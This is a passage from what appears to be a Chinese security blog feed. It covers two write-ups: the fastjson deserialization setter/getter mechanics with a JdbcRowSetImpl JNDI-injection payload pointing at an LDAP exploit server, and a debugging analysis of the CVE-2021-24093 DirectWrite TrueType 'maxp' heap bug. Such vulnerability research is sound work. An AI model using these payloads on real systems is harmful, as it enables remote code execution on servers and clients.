string">"{\"被屏蔽的type\":\"com.fastjson.Person\", \"name\":\"lala\", \"full_name\":\"lalalolo\", \"age\": 13, \"prop\": {\"123\":123}, \"sex\": 1}"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//反序列化</span>        Object obj <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>eneity3<span class="token punctuation">,</span>Person<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//输出会调用obj对象的tooString函数</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果如下</p><pre class="line-numbers language-java"><code class="language-java">Person构造函数<span class="token function">setAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">getProp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>Person Object<span class="token punctuation">]</span> name<span class="token operator">=</span>lala full_name<span class="token operator">=</span>null<span class="token punctuation">,</span> age<span class="token operator">=</span><span class="token number">13</span><span class="token punctuation">,</span> prop<span class="token operator">=</span>null<span class="token punctuation">,</span> sex<span class="token operator">=</span>null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>public name 反序列化成功<br>private full_name 反序列化失败<br>private age setAge函数被调用<br>private sex getsex函数没有被调用<br>private prop getprop函数被成功调用</p><p>可以得知：</p><p>1.public修饰符的属性会进行反序列化赋值，private修饰符的属性不会直接进行反序列化赋值，而是会调用setxxx(xxx为属性名)的函数进行赋值。<br>2.getxxx(xxx为属性名)的函数会根据函数返回值的不同，而选择被调用或不被调用</p><p>进入build函数后会遍历一遍传入class的所有方法，去寻找满足set开头的特定类型方法；再遍历一遍所有方法去寻找get开头的特定类型的方法</p><p><strong>set开头的方法要求如下</strong>：<br>1.方法名长度大于4且以set开头，且第四个字母要是大写<br>2.非静态方法<br>3.返回类型为void或当前类<br>4.参数个数为1个</p><p>寻找到符合要求的set开头的方法后会根据一定规则提取方法名后的变量名（好像会过滤_，就是set_name这样的方法名中的下划线会被略过，得到name）。再去跟这个类的属性去比对有没有这个名称的属性。</p><p>如果没有这个属性并且这个set方法的输入是一个布尔型（是boolean类型，不是Boolean类型，这两个是不一样的），会重新给属性名前面加上is，再取头两个字符，第一个字符为大写（即isNa），去寻找这个属性名。</p><p><strong>get开头的方法要求如下</strong>：</p><p>1.方法名长度大于等于4<br>2.非静态方法<br>3.以get开头且第4个字母为大写<br>4.无传入参数<br>5.返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>通过上述我们知道：<br>1.被屏蔽的type可以指定反序列化成服务器上的任意类然后服务端会解析这个类，提取出这个类中符合要求的setter方法与getter方法（如setxxx）<br>2.如果传入json字符串的键值中存在这个值（如xxx)，就会去调用执行对应的setter、getter方法（即setxxx方法、getxxx方法）</p><p>看上去应该是挺正常的使用逻辑，反序列化需要调用对应参数的setter、getter方法来恢复数据。<strong>但是在可以调用任意类的情况下，如果setter、getter方法中存在可以利用的情况，就会导致任意命令执行。</strong></p><p>我们先来看最开始的漏洞版本是&lt;=1.2.24，在这个版本前是默认支持被屏蔽的type这个属性的。</p><h2 id="fastjson-lt-1-2-24-JNDI注入利用链——com-sun-rowset-JdbcRowSetImpl"><a href="#fastjson-lt-1-2-24-JNDI注入利用链——com-sun-rowset-JdbcRowSetImpl" class="headerlink" title="fastjson<=1.2.24 JNDI注入利用链——com.sun.rowset.JdbcRowSetImpl"></a>fastjson&lt;=1.2.24 JNDI注入利用链——com.sun.rowset.JdbcRowSetImpl</h2><p>JNDI注入利用链是通用性最强的利用方式，在以下三种反序列化中均可使用：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token function">parse</span><span class="token punctuation">(</span>jsonStr<span class="token punctuation">)</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonStr<span class="token punctuation">)</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonStr<span class="token punctuation">,</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>下面需要补一个利用链的知识：<br>常见的一个漏洞触发代码：</p><pre class="line-numbers language-java"><code class="language-java">String uri <span class="token operator">=</span> <span class="token string">"rmi://127.0.0.1:1099/aa"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//可控uri</span>Context ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>衍生到了：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>rowset<span class="token punctuation">.</span>JdbcRowSetImpl<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CLIENT</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        JdbcRowSetImpl JdbcRowSetImpl_inc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JdbcRowSetImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//只是为了方便调用</span>        JdbcRowSetImpl_inc<span class="token punctuation">.</span><span class="token function">setDataSourceName</span><span class="token punctuation">(</span><span class="token string">"rmi://127.0.0.1:1099/aa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//可控uri</span>        JdbcRowSetImpl_inc<span class="token punctuation">.</span><span class="token function">setAutoCommit</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/39.png"></div><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/40.png"></div><p>第一句就满足了这里的对DataSourceName的需要摸索与通过这段代码可以达到上面JNDI注入的效果。</p><p>下面尝试用fastjson的被屏蔽的type来使服务端执行以上代码，可以看到我们需要调用的两个函数都是以set开头！这说明我们可以把这个函数当作setter函数进行调用！</p><p>去看一下这两个函数接口符不符合setter函数的条件</p><p>public void setDataSourceName(String var1) throws SQLException<br>public void setAutoCommit(boolean var1)throws SQLException</p><p>满足</p><p>payload为：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">{</span>    <span class="token string">"被屏蔽的type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>   <span class="token comment" spellcheck="true">//调用com.sun.rowset.JdbcRowSetImpl函数中的</span>    <span class="token string">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://127.0.0.1:1389/Exploit"</span><span class="token punctuation">,</span>   <span class="token comment" spellcheck="true">// setdataSourceName函数 传入参数"ldap://127.0.0.1:1389/Exploit"</span>    <span class="token string">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span> <span class="token comment" spellcheck="true">// 再调用setAutoCommit函数，传入true</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>java环境：jdk1.8.0_161 &lt; 1.8u191 （可以使用ldap注入）</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSON<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>User<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">POC</span> <span class="token punctuation">{</span>    String payload <span class="token operator">=</span>   <span class="token string">"{\"被屏蔽的type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true}"</span><span class="token punctuation">;</span>    JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/41.png"></div><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Java反序列化 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-24093 Windows图形组件远程执行代码漏洞分析</title>
      <link href="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/"/>
      <url>/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Windows图形组件DWrite库是用于高质量文本呈现的用户模式动态库，DWrite库存在远程代码执行漏洞。目前已有POC，POC可以实现任意地址写任意内容。</p><h1 id="0x01-漏洞信息"><a href="#0x01-漏洞信息" class="headerlink" title="0x01 漏洞信息"></a>0x01 漏洞信息</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><p>漏洞名称：Windows图形组件远程执行代码漏洞<br>漏洞编号：CVE-2021-24093<br>漏洞类型：数组越界<br>CVSS评分：8.8<br>基础条件：用户访问网页</p><h2 id="组件概述"><a href="#组件概述" class="headerlink" title="组件概述"></a>组件概述</h2><p>Microsoft DirectWrite是用于高质量文本呈现的现代Windows API。它的大部分代码位于DWrite.dll用户模式库中。它用作各种广泛使用的桌面程序（例如Windows上的chrome，Firefox和Edge）的字体光栅化程序。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用chrome浏览器访问Web页面，渲染引擎进程异常，导致chorme页面崩溃。</p><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>漏洞主要影响Win10的某些版本1909等及Windows Server 2016、2019、2004、20H2等系统。</p><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>Windows 10 1909专业版x64，chrome 86.0.4240.193(64位)</p><p>poc.html放在本机，漏洞环境也在本机</p><h2 id="2-复现"><a href="#2-复现" class="headerlink" title="2.复现"></a>2.复现</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/0.png"></div>打开poc.html，选择加载ttf文件<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/1.png"></div><p>浏览器渲染引擎崩溃</p><h2 id="3-定位"><a href="#3-定位" class="headerlink" title="3.定位"></a>3.定位</h2><p>（1） 打开Html页面时会启动多个chrome进程，首先需要定位到哪个是渲染引擎进程。</p><p>（2）先关闭chrome浏览器(否则会影响定位结果)，使用火绒剑来定位渲染引擎进程。</p><p>做如下设置</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/2.png"></div><p>（3）首先先看看运行崩溃的正常捕获情况：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/3.png"></div><p>我们看到id为4780的进程发生过崩溃，盲猜目标就是第六个进程，此时我们尝试不加载ttf文件</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/4.png"></div><p>此时便没有崩溃进程，利用windbg attach这个进程，输入g运行，chrome加载ttf文件，此时便可以断到引发崩溃的位置。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/5.png"></div><p>看看当前寄存器r8：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/6.png"></div><h1 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>漏洞文件：DWrite.dll<br>漏洞函数：fsg_ExecuteGlyph<br>漏洞对象：TrueType字体中的”maxp”表</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>TrueType字体通常包含在单个TrueType字体文件中，其后缀为.TTF。TrueType中的所有数据都使用big-endian编码，TTF文件中包含了字体的版本号和几个表。</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">typedef</span>   sturct<span class="token punctuation">{</span>    <span class="token keyword">char</span>   tag<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    ULONG   checkSum<span class="token punctuation">;</span>    ULONG   offset<span class="token punctuation">;</span>    ULONG   length<span class="token punctuation">;</span><span class="token punctuation">}</span>TableEntry<span class="token punctuation">;</span><span class="token keyword">typedef</span>   <span class="token keyword">struct</span><span class="token punctuation">{</span>    Fixed   sfntversion<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//0x10000   for   version   1.0</span>    USHORT   numTables<span class="token punctuation">;</span>    USHORT   searchRange<span class="token punctuation">;</span>    USHORT   entrySelector<span class="token punctuation">;</span>    USHORT   rangeShift<span class="token punctuation">;</span>    TableEntry   entries<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//variable   number   of   TableEntry</span><span class="token punctuation">}</span>TableDirectory<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> TableDirectory结构的最后一个字段是可变长度的tableentry结构的数组，安体中的每个表对应其中一项。TrueType字体中的每个表都保存了不同的逻辑信息—–如图元中数据、字符到图元的映射、字距调整信息等等。</p><pre class="line-numbers language-c"><code class="language-c">head           字体头                                           字体的全局信息cmap           字符代码到图元的映射               把字符代码映射为图元索引glyf           图元数据                                       图元轮廓定义以及网格调整指令maxp           最大需求表                                   字体中所需内存分配情况的汇总数据mmtx           水平规格                                       图元水平规格loca           位置表索引                                   把元索引转换为图元的位置name           命名表                                           版权说明、字体名、字体族名、风格名等等hmtx           水平布局                                       字体水平布局星系：上高、下高、行间距、最大前进宽度、最小左支撑、最小右支撑kerm           字距调整表                                   字距调整对的数组post           PostScript信息                           所有图元的PostScript   FontInfo目录项和PostScript名PCLT           PCL   <span class="token number">5</span>数据                                     HP   PCL   5Printer   Language   的字体信息：字体数、宽度、x高度、风格、记号集等等OS<span class="token operator">/</span><span class="token number">2</span>           OS<span class="token operator">/</span><span class="token number">2</span>和Windows特有的规格         TrueType字体所需的规格集<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> TrueType字体是一种非常灵活的数据结构，它可以包含可变数目的图元，每个图元可以有不同数目的控制点，甚至还可以有数量可变的图元指令。最大需求表的目的是告知字体栅格器（rasterizer）对内存的需求，以便   在出来字体前分配合适大小的内存。因为性能对字体栅格器非常重要，像MFC的CAarray那样需要频繁进行数据拷贝操作的动态增长的数据结构不合要求。下面是maxp表的结构。</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">typedef</span>   <span class="token keyword">struct</span><span class="token punctuation">{</span>    Fixed   Version<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//0x00010000   for   version   1.0.  4bit</span>    USHORT   numGlypha<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//Number   of   glyphs   in   the   font   .</span>    USHORT   maxPoints<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//Max   points   in   noncomposite   glyph   .</span>    RSHORT   maxContours<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//Max   contours   in   noncomposite   glyph.</span>    USHORT   maxCompositePoints<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Max   points   in   a   composite   glyph.</span>    USHORT   maxCompositeContours<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//Max   contours   in   a   composite   glyph.</span>    USHORT   maxZones<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//   1   if   not   use   the   twilight   zone   [Z0],</span>                                    <span class="token comment" spellcheck="true">//or   2   if   so   use   Z0;2   in   most   cases.</span>    USHORT   max   TwilightPoints   <span class="token punctuation">;</span><span class="token operator">/</span>   Maximum   points   used   in   Z0<span class="token punctuation">.</span>    USHORT   maxStorage<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//Number   of   storage   area   locations.</span>    USHORT   maxFunctionDefs<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//Number   of   FDEFs.</span>    USHORT   maxStackElements<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//Number   of   depth.</span>    USHORT   maxSizeOfInstructions<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//Max   byte   count   for   glyph   inst.</span>    USHORT   maxComponentElements<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//Max   number   top   components   refernced.</span>    USHORT   maxComponentDepth<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//Max   levels   of   recursion.</span><span class="token punctuation">}</span>Table_maxp<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p> ttf文件的二进制数据</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/7.png"></div><p> USHORT == 2 bit<br> RSHORT == 2 bit</p><p> 方框的位置是maxp表的tableEntry结构，偏移0x158的是maxp表的内容，numGlypha字段是0x0006 maxPoints字段值为0x0000(距离箭头2偏移0x6)，maxContours字段是0x002a，maxCompositePoints字段为0x0003(距离箭头2偏移0xA)。</p><p> poc内容：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/8.png"></div><p>正常情况下，ttf文件中maxPoints字段值为0x168，maxCompositePoins字段值为0x2352，在poc.ttf文件中将”maxp”结构中maxPoints字段的值改为0，将maxCompositePoins值改为3，当加载并光栅化损坏的”maxp”表的数据时，会导致堆分配缓冲区过小，调用栈如下：</p><p>函数DWrite!fsg_ExecuteGlyph崩溃，调用栈如下：</p><pre><code># Child-SP          RetAddr               Call Site00 000000ff`debfa170 00007fff`c05a3886     DWrite!fsg_ExecuteGlyph+0x77201 000000ff`debfa2a0 00007fff`c05a35ab     DWrite!fsg_CreateGlyphData+0x12e02 000000ff`debfa360 00007fff`c05a2d65     DWrite!fsg_GridFit+0xbb03 000000ff`debfa3f0 00007fff`c05a17fa     DWrite!fs__Contour+0x1c104 000000ff`debfa4e0 00007fff`c05a15e7     DWrite!TrueTypeRasterizer::Implementation::RasterizeInternal+0xfa05 000000ff`debfa520 00007fff`c05a1534     DWrite!TrueTypeRasterizer::Implementation::GetBitmapInternal+0x2f</code></pre><p>查看漏洞库版本</p><pre><code>0:000&gt; lmm DWrite -vUnknown option '-'Browse full module liststart             end                 module name00007fff`c0520000 00007fff`c081e000   DWrite     (pdb symbols)          C:\ProgramData\Dbg\sym\DWrite.pdb\FCC9572DA72927C3057C3859D67B0DD61\DWrite.pdb    Loaded symbol image file: C:\Windows\SYSTEM32\DWrite.dll    Image path: C:\Windows\SYSTEM32\DWrite.dll    Image name: DWrite.dll    Browse all global symbols  functions  data    Image was built with /Brepro flag.    Timestamp:        793762E4 (This is a reproducible build file hash, not a timestamp)    CheckSum:         00300C4B    ImageSize:        002FE000    File version:     10.0.18362.356    Product version:  10.0.18362.356    File flags:       0 (Mask 3F)    File OS:          40004 NT Win32    File type:        2.0 Dll    File date:        00000000.00000000    Translations:     0409.04b0    Information from resource tables:        CompanyName:      Microsoft Corporation        ProductName:      Microsoft® Windows® Operating System        InternalName:     DWrite        OriginalFilename: DWrite        ProductVersion:   10.0.18362.356        FileVersion:      10.0.18362.356 (WinBuild.160101.0800)        FileDescription:  Microsoft DirectX Typography Services        LegalCopyright:   © Microsoft Corporation. All rights reserved.</code></pre><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>用IDA逆向DWrite.dll基本上看不出什么东西…</p><h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><h3 id="漏洞如何利用"><a href="#漏洞如何利用" class="headerlink" title="漏洞如何利用"></a>漏洞如何利用</h3><p>不调试真不知道都在干些什么：断到memset处，第三个参数是0x148</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/9.png"></div><p>一直运行到崩溃的位置</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/10.png"></div><p>向无效地址写入内容，自然会引起崩溃，我们注意到在前面的mov r8,qword ptr [rax+8]对r8进行赋值的，我们看看r8地址的内容：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/11.png"></div><p>那么猜测一下可能是以下两个问题：<br>1.由于溢出的原因，导致读取的ttf数据覆盖掉了本来的合法地址<br>2.由于rsi本身偏移的问题，也就是说rsi的值向后移动了一部分，将后面的ttf的数据作为地址</p><p>那么我们就需要关注一下一开始的堆地址以及后面的寄存器中值的变化：</p><p><strong>第一个memset</strong>：</p><p>断在rcx赋值时</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/12.png"></div>断在第一个memset处<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/13.png"></div><p>第一个堆地址：0x000001e22eba6c50，我们发现在memset的时候堆地址是0x000001e22eba71ec（偏移增加了0x59c）</p><p><strong>第二个memset</strong>：</p><p>第二个堆地址：0x000001e22eba6c50,我们发现memset的时候地址是0x000001e22eba71c0（偏移增加了0x6c0）</p><p><strong>赋值非法地址给r8的时候</strong></p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/14.png"></div><p>rsi的值是：0x000001e22eba7310</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/15.png"></div><p>TTF中的数据覆盖了[rsi+8]，在后面的add word ptr [r8+56],ax指令中，ax其实也是可以通过ttf数据控制</p><p>也就是说通过<br>mov     r8, qword ptr [rsi+8]<br>mov     rax, qword ptr [rsi+0A8h]<br>add     word ptr [r8+56h], ax<br>就可以达到任意代码执行的目的，因为指针和指针的值都可以通过ttf数据控制。</p><p>但是我们还是没有解决到底是什么原因触发的这个漏洞</p><h3 id="触发漏洞的原因"><a href="#触发漏洞的原因" class="headerlink" title="触发漏洞的原因"></a>触发漏洞的原因</h3><p><strong>函数分析</strong>：fsg_ExecuteGlyph函数对堆块内部的两个整数数组，对应于x坐标和y坐标进行操作，实际上数组的较小，fsg_ExecuteGlyph函数先调用了两次memset将数组清零，如果字体是一个变量且指定了轴值，还会调用TrueTypeRasterizer::Implementation::ApplyOutlineVariation-&gt;GlyphOutlineVariationInterpolator::ApplyVariation将字体中的数据赋值到坐标数组，这样就会破坏到后续的结构成员。</p><p>那么我们可以看看这个堆块到底是分配了多大的：</p><p>计算内存大小的函数调用链为TrueTypeRasterizer::Implementation::Initialize-&gt; fs_NewSfnt -&gt;fsg_WorkSpaceSetOffsets函数fsg_WorkSpaceSetOffsets内部计算需要申请的内存空间大小并将结果传出到fs_NewSfnt中。</p><p>计算所需内存的过程可以通过条件断点的方式来调试，附加到调试器后，可以设置如下断点命令</p><p>bp DWrite!TrueTypeRasterizer::Implementation::Initialize “r $t0=$t0+1; .printf "Initialize times:%d\n",@$t0;.echo;gc”</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/04/15/cve-2021-24093-windows-tu-xing-zu-jian-yuan-cheng-zhi-xing-dai-ma-lou-dong-fen-xi/16.png"></div><p>我们看到第13次调用TrueTypeRasterizer::Implementation::Initialize函数之后就会进入崩溃</p><p>重启下断点：<br>bp DWrite!TrueTypeRasterizer::Implementation::Initialize “r $t0=$t0+1; .printf "Initialize times:%d\n",@$t0;.echo;.if(@$t0 == 0x0D){}.else{gc}”</p><div 